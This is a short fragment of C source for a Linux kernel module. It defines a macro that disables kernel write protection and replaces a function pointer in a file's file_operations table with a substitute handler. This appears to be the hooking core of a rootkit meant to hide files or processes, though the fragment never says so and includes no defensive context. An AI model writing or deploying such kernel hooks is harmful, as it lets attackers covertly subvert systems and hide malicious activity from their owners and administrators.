#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/printk.h>
#include <linux/dirent.h>

void enable_wp(void);
void disable_wp(void);

#define set_file_op(op, path, fake, real)				\
	do								\
	{								\
		struct file *filp;					\
		struct file_operations *f_op;				\
									\
		filp = filp_open(path, O_RDONLY, 0);			\
		if(IS_ERR(filp))					\
		{							\
			real = NULL;					\
		}							\
		else							\
		{							\
			f_op = (struct file_operations*)filp->f_op;	\
			real = f_op->op;				\
									\
			disable_wp();					\
			f_op->op = fake;				\
			enable_wp();					\
		}							\
	}while(0)						

